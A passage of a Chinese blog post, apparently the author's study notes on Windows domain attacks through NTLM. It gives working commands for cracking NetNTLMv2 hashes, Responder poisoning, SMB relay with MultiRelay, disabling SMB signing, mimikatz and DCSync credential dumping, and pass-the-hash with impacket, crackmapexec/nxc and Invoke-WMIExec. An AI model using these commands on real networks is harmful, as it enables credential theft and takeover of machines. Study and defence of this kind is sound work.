+<p><code>aaa::xx:387676d184713b48:e6fe6dbcec53d7ed73a4968691e32e29:010100000000000060739831a119dc01ccdacc8319776fec00000000020004005800580001000a005700320030003100320004000c00780078002e0063006f006d0003001800770032003000310032002e00780078002e0063006f006d0005000c00780078002e0063006f006d000700080060739831a119dc010600040002000000080030003000000000000000010000000020000070b12a1a26693aba059a827299cade7b2a32a4655457fc3ef2ed200dfbbfee990a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00330030002e0033003300000000000000000000000000</code></p>
+<p>hashcat 爆破命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 5600 aaa::xx:387676d184713b48:e6fe6dbcec53d7ed73a4968691e32e29:010100000000000060739831a119dc01ccdacc8319776fec00000000020004005800580001000a005700320030003100320004000c00780078002e0063006f006d0003001800770032003000310032002e00780078002e0063006f006d0005000c00780078002e0063006f006d000700080060739831a119dc010600040002000000080030003000000000000000010000000020000070b12a1a26693aba059a827299cade7b2a32a4655457fc3ef2ed200dfbbfee990a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00330030002e0033003300000000000000000000000000 /usr/share/wordlists/rockyou.txt -o out.txt --force<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">-m： hash-type，5600对应NetNTLMv2，详细参数可查表：https://hashcat.net/wiki/doku.php?<span class="hljs-built_in">id</span>=hashcat<br>-o： 输出文件 字典文件为/usr/share/wordlists/rockyou.txt<br>–force： 代表强制执行，测试系统不支持Intel OpenCL<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-17.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="NTLM-Type-3-响应类别"><a href="#NTLM-Type-3-响应类别" class="headerlink" title="NTLM Type 3 响应类别"></a>NTLM Type 3 响应类别</h3><p><strong>在 Type 3 中的Response根据系统版本被分为六种响应类型</strong></p>
+<ol>
+<li>LM (LAN Manager) Response -  由大多数较早的客户端发送，这是“原始”响应类型</li>
+<li>NTLM Response - 这是由基于NT的客户端发送的，包括Windows 2000和XP</li>
+<li>NTLMv2 Response - 在Windows NT Service Pack 4中引入的一种较新的响应类型。它替换启用了NTLMv2的系统上的NTLM响应</li>
+<li>LMv2 Response - 替代NTLMv2系统上的LM响应</li>
+<li>NTLM2 Session Response - 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义</li>
+<li>Anonymous Response - 当匿名上下文正在建立时使用; 不提供实际凭据，也不进行真正的身份验证。Type 3消息中显示”Stub”字段</li>
+</ol>
+<p><strong>加密流程差异</strong></p>
+<p>所有响应类型均采用 Challenge&#x2F;Response 验证机制，但 Challenge 和加密算法有所不同：</p>
+<ul>
+<li><p>Challenge</p>
+<ul>
+<li>NTLMv1：8 字节</li>
+<li>NTLMv2：16 字节</li>
+</ul>
+</li>
+<li><p>Net-NTLM Hash</p>
+<ul>
+<li>NTLMv1：主要使用 DES</li>
+<li>NTLMv2：主要使用 HMAC-MD5</li>
+</ul>
+</li>
+</ul>
+<p><strong>LmCompatibilityLevel 设置与默认行为</strong></p>
+<p>响应类型由 LmCompatibilityLevel 安全设置决定。默认值如下：</p>
+<ul>
+<li>Windows 2000 &#x2F; Windows XP：发送 LM &amp; NTLM 响应</li>
+<li>Windows Server 2003：仅发送 NTLM 响应</li>
+<li>Windows Vista &#x2F; Windows Server 2008 &#x2F; Windows 7 &#x2F; Windows Server 2008 R2 及更高版本：仅发送 NTLMv2 响应</li>
+</ul>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://davenport.sourceforge.net/ntlm.html">The NTLM Authentication Protocol and Security Support Provider</a></p>
+<h1 id="Net-NTLM-hash-捕获"><a href="#Net-NTLM-hash-捕获" class="headerlink" title="Net-NTLM hash 捕获"></a>Net-NTLM hash 捕获</h1><p>Windows系统名称解析顺序为：</p>
+<ol>
+<li>本地 hosts 文件（%windir%\System32\drivers\etc\hosts）</li>
+<li>DNS 缓存 &#x2F; DNS 服务器</li>
+<li>链路本地多播名称解析（LLMNR）和 NetBIOS 名称服务（NBT-NS）</li>
+</ol>
+<p>如果在缓存中没有找到名称，DNS 名称服务器又请求失败时，Windows 系统就会通过链路本地多播名称解析（LLMNR）和 Net-BIOS 名称服务（NBT-NS）在本地进行名称解析</p>
+<hr>
+<p>在 Windows Active Directory 环境中，当客户端输入不存在或 DNS 中没有的主机名时，就会通过未经认证的 UDP 广播向网络请求解析（LLMNR 或 NBT-NS）。由于该过程未被认证，网络上的任何机器都可响应并伪装成目标主机。攻击者可利用工具（如 Responder）冒充目标计算机，当受害者尝试连接时，攻击者截获其 Net-NTLMv2 哈希，实现类似 ARP 欺骗的中间人攻击。</p>
+<p>Responder 项目地址：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+<p>kali中自带Responder，配置文件位置： &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">responder -I eth0  <span class="hljs-comment"># 启动  -I 指定监听的网卡接口</span><br></code></pre></td></tr></table></figure>
+
+<p>启动后在域内主机上访问错误的unc触发smb（或者使用HTTP、LDAP、MSSQL等可以携带NTLM的协议触发）</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看到成功捕获到了NTLMv2 hash</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>后续再次抓会默认跳过已抓到的hash，历史数据可以在 &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.db 查看</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sqlite3 Responder.db<br><br>.<span class="hljs-keyword">tables</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> responder;<br></code></pre></td></tr></table></figure>
+
+<p>之后可以选择hashcat或者john来尝试爆破</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="中间人-中继-relay-攻击"><a href="#中间人-中继-relay-攻击" class="headerlink" title="中间人 中继(relay)攻击"></a>中间人 中继(relay)攻击</h2><p><img src="/img/%E5%86%85%E7%BD%91/ntlm-9.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>Responder 还提供了一些其他工具，使攻击者能够执行攻击，例如通过中继 NTLMv2 hash 来获取网络中计算机的 Shell 访问权限。但是需要管理员权限，普通域用户的 hash 不能获得其他计算机的shell</p>
+</blockquote>
+<p>例子：一位域管理员用户尝试访问一个不存在的共享，Responder 对其进行了投毒欺骗，随后 Multirelay.py 脚本使用捕获到的 NTLMv2 hash 登录到 Windows 域网络中的一台计算机</p>
+<p>kali下的工具目录在 &#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools</p>
+<p>先运行RunFinger脚本查看SMB签名信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿dr0n1)-[/usr/share/responder/tools]<br>└─# python RunFinger.py -i 192.168.100.0/24<br>[SMB2]:[<span class="hljs-string">&#x27;192.168.100.150&#x27;</span>, Os:<span class="hljs-string">&#x27;Windows 8.1/Server 2012R2&#x27;</span>, Build:<span class="hljs-string">&#x27;9600&#x27;</span>, Domain:<span class="hljs-string">&#x27;XX&#x27;</span>, Bootime: <span class="hljs-string">&#x27;2025-08-29 09:28:24&#x27;</span>, Signing:<span class="hljs-string">&#x27;True&#x27;</span>, RDP:<span class="hljs-string">&#x27;False&#x27;</span>, SMB1:<span class="hljs-string">&#x27;False&#x27;</span>, MSSQL:<span class="hljs-string">&#x27;False&#x27;</span>]<br>[SMB2]:[<span class="hljs-string">&#x27;192.168.100.177&#x27;</span>, Os:<span class="hljs-string">&#x27;Windows 7/Server 2008R2&#x27;</span>, Build:<span class="hljs-string">&#x27;7600&#x27;</span>, Domain:<span class="hljs-string">&#x27;XX&#x27;</span>, Bootime: <span class="hljs-string">&#x27;2025-08-29 09:28:22&#x27;</span>, Signing:<span class="hljs-string">&#x27;False&#x27;</span>, RDP:<span class="hljs-string">&#x27;False&#x27;</span>, SMB1:<span class="hljs-string">&#x27;True&#x27;</span>, MSSQL:<span class="hljs-string">&#x27;False&#x27;</span>]<br>[SMB1]:[<span class="hljs-string">&#x27;192.168.100.177&#x27;</span>, Os:<span class="hljs-string">&#x27;Windows 7 Enterprise 7600&#x27;</span>, Domain:<span class="hljs-string">&#x27;XX&#x27;</span>, Signing:<span class="hljs-string">&#x27;False&#x27;</span>, Null Session: <span class="hljs-string">&#x27;True&#x27;</span>, RDP:<span class="hljs-string">&#x27;False&#x27;</span>, MSSQL:<span class="hljs-string">&#x27;False&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<p>如果开启了 SMB Signing，重放攻击就无法利用，但这里的例子中除了域控是默认开启的，其他的机器都是默认关闭的状态</p>
+<p>关闭SMB签名验证的命令：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击前先修改Responder的配置文件，将SMB和HTTP关闭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs conf">; Servers to start<br>SQL      = On<br>SMB      = Off<br>QUIC     = On<br>RDP      = On<br>Kerberos = On<br>FTP      = On<br>POP      = On<br>SMTP     = On<br>IMAP     = On<br>HTTP     = Off<br>HTTPS    = On<br>DNS      = On<br>LDAP     = On<br>DCERPC   = On<br>WINRM    = On<br>SNMP     = On<br>MQTT     = On<br></code></pre></td></tr></table></figure>
+
+<p>开启投毒欺骗（这里 responder 的作用就是当访问一个不存在的共享路径，来抓取网络中所有的 LLMNR 和 NetBIOS 请求并进行响应）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">responder -I eth0<br></code></pre></td></tr></table></figure>
+
+
+<p>运行MultiRelay脚本进行中继</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL<br></code></pre></td></tr></table></figure>
+
+<p>现在，域中任何的管理员用户尝试访问&#x2F;拼写错误的、不存在的共享时，就可以获得目标机器的shell</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-8.png" srcset="/img/loading.gif" lazyload></p>
+<p>在实际利用中可以结合钓鱼邮件等操作诱骗管理员进行操作，我们通过监听&#x2F;中继就能获得目标当前用户的 Net-NTLM hash，然后进行后续其他操作</p>
+<h2 id="反射-reflect-攻击"><a href="#反射-reflect-攻击" class="headerlink" title="反射(reflect)攻击"></a>反射(reflect)攻击</h2><p><img src="/img/%E5%86%85%E7%BD%91/ntlm-10.png" srcset="/img/loading.gif" lazyload></p>
+<p>攻击者通过一定的方法使得 Client 与自己进行认证，然后将 Client 发送过来的 Credential 转发回 Client 自身，从而攻击 Client</p>
+<p>在 Windows 权限提升工具中，著名的 土豆（Potato）系列 中的几种提权方法就利用了类似的反射攻击原理。它们通过劫持或欺骗本地的认证机制并反射认证信息，实现从低权限账户到高权限账户（通常是 SYSTEM 权限）的提权操作</p>
+<p>详细步骤见 <a href="/posts/a04618bd">windows提权笔记</a></p>
+<h1 id="PTH（pass-the-hash）"><a href="#PTH（pass-the-hash）" class="headerlink" title="PTH（pass-the-hash）"></a>PTH（pass-the-hash）</h1><p>哈希传递（Pass The Hash，简称 PTH）攻击是一种通过获取账户密码散列值（NTLM Hash）来进行渗透的技术。在 Windows 系统中，NTLM 认证的 TYPE 3 消息计算 Response 时，客户端使用的是用户的 NTLM Hash，而非明文密码。因此，在模拟用户登录或访问资源时，无需知道用户的真实密码，只需掌握其 Hash 值。攻击者便可直接利用 NTLM Hash 远程登录目标主机或执行相应操作</p>
+<p>简单来说就是 <strong>攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码</strong></p>
+<p>另外需要注意微软发布的补丁KB2871997，在一定程度上能缓解此类攻击，但并非完全防御，可以参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193150">KB22871997是否真的能防御PTH攻击？</a></p>
+<h3 id="被控主机获取NTLM-hash"><a href="#被控主机获取NTLM-hash" class="headerlink" title="被控主机获取NTLM hash"></a>被控主机获取NTLM hash</h3><p><strong>方式一：使用 mimikatz.exe 本体获取hash</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>sekurlsa::logonpasswords <span class="hljs-comment">#抓取保存的所有凭证（包括hash）</span><br>lsadump::dcsync /domain:xx.com /all /csv <span class="hljs-comment"># 通过DSync导出所有用户的Hash</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>方式二：在 cs 中获取hash</strong></p>
+<p>上线后在beacon中执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">logonpasswords<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>方式三：在 msf 中获取hash</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xx.com /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>其实都是使用的内置的mimikatz</p>
+<h3 id="利用NTLM-hash"><a href="#利用NTLM-hash" class="headerlink" title="利用NTLM hash"></a>利用NTLM hash</h3><p>使用到的工具：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>：神器</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">Impacket工具集</a>：它是一个开源的 Python 库，专注于处理网络协议和与 Windows 系统交互，广泛用于域环境渗透、凭据窃取、远程执行和 Kerberos 协议操作</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a>：CrackMapExec是一款强大的内网域渗透工具，支持smb和winrm等协议执行命令、枚举域信息、密码攻击以及检测安全漏洞</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec">NetExec</a>：是 CrackMapExec 的后继版本</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/">Invoke-TheHash模块</a>：Invoke-TheHash 脚本可以用来通过哈希传递在远程主机上执行 WMI 和 SMB 命令。且客户端不需要本地管理员权限</li>
+</ul>
+<p><strong>方法一：通过 mimikatz</strong></p>
+<p>mimikatz的pth功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程lsass.exe的信息<br>对于8.1&#x2F;2012r2，安装补丁kb2871997的Win 7&#x2F;2008r2&#x2F;8&#x2F;2012，可以使用AES keys代替NT hash</p>
+<p>需要445或135端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sekurlsa::pth /user:&lt;pth 的对象&gt; /domain:&lt;域名&gt; /ntlm:&lt;ntlm hash&gt; [/run:name]</span><br><br>privilege::debug<br>sekurlsa::pth /user:administrator /domain:xx.com /ntlm:f29eef39afe448760a66047b46efb03e /run:cmd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>方法二：通过 SMB协议</strong></p>
+<p>需要445或139端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbexec xx/administrator@192.168.100.150 -hashes :f29eef39afe448760a66047b46efb03e<br>crackmapexec smb 192.168.100.150 -u administrator -H f29eef39afe448760a66047b46efb03e -d xx -x <span class="hljs-string">&quot;whoami&quot;</span><br>nxc smb 192.168.100.150 -u Administrator -p <span class="hljs-string">&#x27;Dr0n111&#x27;</span> -x <span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-2.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>方法三：通过 psexec</strong></p>
+<p>需要445或139端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-psexec administrator@192.168.100.150 -hashes :f29eef39afe448760a66047b46efb03e<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>方法四：通过 atexec</strong></p>
+<p>需要445或139端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-atexec xx.com/administrator@192.168.100.150 <span class="hljs-built_in">whoami</span> -hashes :f29eef39afe448760a66047b46efb03e<br><span class="hljs-comment"># nxc smb 192.168.100.150 -u administrator -p &#x27;Dr0n111&#x27; -x whoami --exec-method atexec</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>方法五：通过 dcomexec</strong></p>
+<p>需要135端口开放，受防火墙影响</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-dcomexec administrator@192.168.100.150 <span class="hljs-built_in">whoami</span> -hashes :f29eef39afe448760a66047b46efb03e<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>方法六：通过 smbclient</strong></p>
+<p>需要445或139端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbclient administrator@192.168.100.150 -hashes :f29eef39afe448760a66047b46efb03e<br></code></pre></td></tr></table></figure>
+
+<p>impacket-smbclient 是一个 交互式 SMB 客户端，类似于 smbclient 或 FTP 客户端，只支持与共享目录相关的操作命令（包括列举目录、上传文件、下载文件、删除文件。具体权限取决于该口令 hash 的权限），它不支持直接执行系统命令（如 whoami）</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/ntlm-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>方法七：通过 wmiexec</strong></p>
+<p>需要135端口开放</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec administrator@192.168.100.150 -hashes :f29eef39afe448760a66047b46efb03e<br>nxc wmi 192.168.100.150 -u administrator --<span class="hljs-built_in">hash</span> <span class="hljs-string">&#x27;f29eef39afe448760a66047b46efb03e&#x27;</span> -x <span class="hljs-built_in">whoami</span> <span class="hljs-comment">#在SMB端口445、139打开时</span><br>nxc wmi 192.168.100.150 -u administrator --<span class="hljs-built_in">hash</span> <span class="hljs-string">&#x27;f29eef39afe448760a66047b46efb03e&#x27;</span> -x <span class="hljs-built_in">whoami</span> -d HTB <span class="hljs-comment">#在SMB端口没有打开时</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-WMIExec</span>.ps1 <span class="hljs-comment"># 导入powershell模块</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-comment"># 如果PowerShell 执行策略阻止了脚本运行，设置临时允许脚本执行</span><br><span class="hljs-built_in">Invoke-WMIExec</span> <span class="hljs-literal">-Target</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.150</span> <span class="hljs-literal">-Domain</span> xx.com <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> f29eef39afe448760a66047b46efb03e <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;calc.exe&quot;</span> <span class="hljs-literal">-verbose</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/carmi/p/17685608.html">域渗透学习</a><br><a target="_blank" rel="noopener" href="https://c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/3-ntlm/3.pth.html">PTH</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a><br><a target="_blank" rel="noopener" href="https://y4er.com/posts/ntlm-hash-and-lm-hash/">Windows本地认证NTLM Hash&amp;LM Hash</a><br><a target="_blank" rel="noopener" href="https://y4er.com/posts/ntlm-and-net-ntlm-hash/">Windows网络认证NTLM&amp;Net-NTLM Hash</a><br><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/07/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLM%E3%80%81NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB/">内网渗透之LM、NTLM认证学习及攻击</a><br><a target="_blank" rel="noopener" href="https://github.com/incredibleindishell/Windows-AD-environment-related/tree/master/Responder">How to use responder tool to perform exploitation in windows environment by stealing NTLMv2 hashes.</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%80%BB%E7%BB%93/" class="print-no-link">#总结</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E5%9F%9F/" class="print-no-link">#域</a>
+      
+        <a href="/tags/NTLM/" class="print-no-link">#NTLM</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>域渗透学习(NTLM篇)</div>
+      <div>https://www.dr0n.top/posts/3f5b8fbe/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dr0n</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年9月4日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.15.8/waline.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.15.8/waline.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.dr0n.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号
+    </a>
+  </span>
+  
+    
+      <span class="beian-police">
+        
+          <span style="visibility: hidden; width: 0">|</span>
+          <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+        
+        <span class="beian-police">浙公网安备33021202003790号</span>
+      </span>
+    
+  
+</div>
+
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
